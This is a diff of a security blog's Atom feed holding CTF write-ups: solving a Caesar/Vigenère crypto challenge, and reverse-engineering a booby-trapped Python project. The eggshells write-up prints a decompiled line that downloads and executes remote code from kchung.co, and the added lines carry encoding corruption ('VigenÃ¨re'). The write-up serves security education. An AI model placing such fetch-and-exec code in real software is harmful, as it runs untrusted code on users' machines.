@@ -1,12 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>High Bytes</title><link href="/" rel="alternate"></link><link href="/feeds/bt3gl.atom.xml" rel="self"></link><id>/</id><updated>2014-09-22T10:20:00-04:00</updated><entry><title>Crypto-200: psifer school</title><link href="/crypto-200-psifer-school.html" rel="alternate"></link><updated>2014-09-22T10:20:00-04:00</updated><author><name>bt3gl</name></author><id>tag:,2014-09-22:crypto-200-psifer-school.html</id><summary type="html">&lt;p&gt;This is the first crypto-problem, and it was supposed to be the easiest one. For this reason I was expecting simple cryptographic algorithms, which turned out to be true.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>High Bytes</title><link href="bt3gl.github.io/" rel="alternate"></link><link href="bt3gl.github.io/feeds/bt3gl.atom.xml" rel="self"></link><id>bt3gl.github.io/</id><updated>2014-09-22T10:20:00-04:00</updated><entry><title>Crypto-200: psifer school</title><link href="bt3gl.github.io/crypto-200-psifer-school.html" rel="alternate"></link><updated>2014-09-22T10:20:00-04:00</updated><author><name>bt3gl</name></author><id>tag:,2014-09-22:bt3gl.github.io/crypto-200-psifer-school.html</id><summary type="html">&lt;p&gt;This is the first crypto-problem, and it was supposed to be the easiest one. For this reason I was expecting simple cryptographic algorithms, which turned out to be true.&lt;/p&gt;
 &lt;p&gt;The problem starts with the following text:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;There's no heartbleed here. Why don't we use these ciphers?&lt;/p&gt;
 &lt;p&gt;nc 54.209.5.48 12345&lt;/p&gt;
 &lt;p&gt;Written by psifertex&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;hr /&gt;
 &lt;h2&gt;Stage One: Caesar Cipher&lt;/h2&gt;
 &lt;h4&gt;Connecting to the Server&lt;/h4&gt;
 &lt;p&gt;We start typing the &lt;strong&gt;netcat&lt;/strong&gt; command in the terminal:&lt;/p&gt;
@@ -129,7 +128,6 @@
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr /&gt;
 &lt;h2&gt;Stage Two: Offset with Special Characters&lt;/h2&gt;
 &lt;p&gt;The second stage starts with the following message:&lt;/p&gt;
 &lt;blockquote&gt;
@@ -164,8 +162,7 @@ not length that matters.&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;I hope you don't have a problem with this challenge. It should be fairly straight forward if you have done lots of basic crypto. The magic phrase for your efforts is "&lt;strong&gt;not not wrong&lt;/strong&gt;". For your efforts, you will get another challenge!&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;hr /&gt;
-&lt;h2&gt;Stage Three: Vigenère Cipher&lt;/h2&gt;
+&lt;h2&gt;Stage Three: VigenÃ¨re Cipher&lt;/h2&gt;
 &lt;p&gt;The next message lets us know that we are close to the end:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Congratulations, you have solved stage 2. You have 9 seconds left.
@@ -176,8 +173,8 @@ Last one.&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;This is a &lt;strong&gt;&lt;a href="http://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher"&gt;Vigenère Cipher&lt;/a&gt;&lt;/strong&gt;, which is basically several Caesar ciphers in sequence, with different shift values, given by a key-word. Finding these shifts when we don't know the key can be done by writing the alphabet 26 times in different rows. In this case, each alphabet is shifted cyclically to the left compared to the previous alphabet (26 Caesar ciphers). &lt;/p&gt;
-&lt;p&gt;Although we could use some &lt;a href="http://smurfoncrack.com/pygenere/"&gt;online Vigenère cracker&lt;/a&gt; to extract the flag from this text, we will instead write a code. We  use Python's library &lt;a href="http://smurfoncrack.com/pygenere/pygenere.php"&gt;pygenere&lt;/a&gt;, which has the methods  &lt;code&gt;crack_message()&lt;/code&gt; to decipher the message and &lt;code&gt;crack_codeword()&lt;/code&gt; to find the key (useful because we don't have the key). We then send our cipher to the following function:&lt;/p&gt;
+&lt;p&gt;This is a &lt;strong&gt;&lt;a href="http://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher"&gt;VigenÃ¨re Cipher&lt;/a&gt;&lt;/strong&gt;, which is basically several Caesar ciphers in sequence, with different shift values, given by a key-word. Finding these shifts when we don't know the key can be done by writing the alphabet 26 times in different rows. In this case, each alphabet is shifted cyclically to the left compared to the previous alphabet (26 Caesar ciphers). &lt;/p&gt;
+&lt;p&gt;Although we could use some &lt;a href="http://smurfoncrack.com/pygenere/"&gt;online VigenÃ¨re cracker&lt;/a&gt; to extract the flag from this text, we will instead write a code. We  use Python's library &lt;a href="http://smurfoncrack.com/pygenere/pygenere.php"&gt;pygenere&lt;/a&gt;, which has the methods  &lt;code&gt;crack_message()&lt;/code&gt; to decipher the message and &lt;code&gt;crack_codeword()&lt;/code&gt; to find the key (useful because we don't have the key). We then send our cipher to the following function:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;solve3&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
   &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;VigCrack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crack_codeword&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
   &lt;span class="n"&gt;dec_msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;VigCrack&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crack_message&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
@@ -192,18 +189,15 @@ Last one.&lt;/p&gt;
 
 
 &lt;p&gt;Reading it carefully give us thee last answer for the flag: &lt;strong&gt;NORMALWORD&lt;/strong&gt;. Sweet!&lt;/p&gt;
-&lt;hr /&gt;
 &lt;h2&gt;Final Words&lt;/h2&gt;
 &lt;p&gt;If you like this solution, take a look at my  &lt;a href="https://github.com/bt3gl/CTFs-and-Hacking-Scripts-and-Tutorials/blob/master/2014-CSAW-CTF/cryptography/crypto-200/psifer-school.py"&gt;exploit for this problem&lt;/a&gt; (Python). &lt;/p&gt;
 &lt;p&gt;If Python is not your thing, check out &lt;a href="https://github.com/bt3gl/CTFs-and-Hacking-Scripts-and-Tutorials/tree/master/2014-CSAW-CTF/cryptography/crypto-200/from_the_net"&gt;scripts from other authors&lt;/a&gt;, in Pearl and in PHP.&lt;/p&gt;
-&lt;hr /&gt;
-&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="CTF"></category><category term="CSAW"></category><category term="Cryptography"></category></entry><entry><title>Reverse Engineering-100: eggshells</title><link href="/reverse-engineering-100-eggshells.html" rel="alternate"></link><updated>2014-09-22T10:20:00-04:00</updated><author><name>bt3gl</name></author><id>tag:,2014-09-22:reverse-engineering-100-eggshells.html</id><summary type="html">&lt;p&gt;This is the first exploitation problem and it starts with the following text:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="CTF"></category><category term="CSAW"></category><category term="Cryptography"></category></entry><entry><title>Reverse Engineering-100: eggshells</title><link href="bt3gl.github.io/reverse-engineering-100-eggshells.html" rel="alternate"></link><updated>2014-09-22T10:20:00-04:00</updated><author><name>bt3gl</name></author><id>tag:,2014-09-22:bt3gl.github.io/reverse-engineering-100-eggshells.html</id><summary type="html">&lt;p&gt;This is the first exploitation problem and it starts with the following text:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;I trust people on the internet all the time, do you?&lt;/p&gt;
 &lt;p&gt;Written by ColdHeat&lt;/p&gt;
 &lt;p&gt;eggshells-master.zip&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;hr /&gt;
 &lt;h2&gt;Unzipping and Analyzing the Files&lt;/h2&gt;
 &lt;p&gt;Let’s unzip the provided zip file:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip eggshells-master.zip
@@ -239,7 +233,6 @@ Last one.&lt;/p&gt;
 
 
 &lt;p&gt;Do you see anything unusual?&lt;/p&gt;
-&lt;hr /&gt;
 &lt;h2&gt;Decompiled a pre-compiled Python File&lt;/h2&gt;
 &lt;p&gt;A pre-compiled Python file stands out in this list: &lt;em&gt;utils.pyc&lt;/em&gt;. We need to decompile it. For this task we use  &lt;a href="https://github.com/gstarnberger/uncompyle"&gt;uncompyle2&lt;/a&gt;, which can be installed with:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo pip install uncompyle2
@@ -289,7 +282,6 @@ Options:
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;hr /&gt;
 &lt;h2&gt;Parsing the Result and Voilà&lt;/h2&gt;
 &lt;p&gt;So all that this file does is in this line:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;exec&lt;/span&gt; &lt;span class="nb"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;urllib2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://kchung.co/lol.py&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
